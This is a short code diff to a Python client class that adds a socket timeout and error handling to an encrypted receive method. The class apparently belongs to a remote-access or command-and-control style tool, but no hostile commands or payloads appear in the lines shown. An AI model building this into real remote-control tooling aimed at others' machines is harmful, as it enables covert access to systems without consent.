@@ -32,9 +32,15 @@ class Client:
 		self.sock.sendall(self.encrypt(data))
 		
 	def recv(self):
-		data = self.sock.recv(4096)		
-		if not data: raise Exception("[-] Client Disconnected")
-				
+		self.sock.settimeout(70)
+		try:
+			data = self.sock.recv(4096)		
+			if not data: raise Exception("[-] Client Disconnected")
+		except Exception as e:
+			self.sock.settimeout(None)
+			raise Exception("[-]Client Disconnected")
+		
+		self.sock.settimeout(None)
 		return self.decrypt(data)
 		
 	def make_prompt(self, data_package):
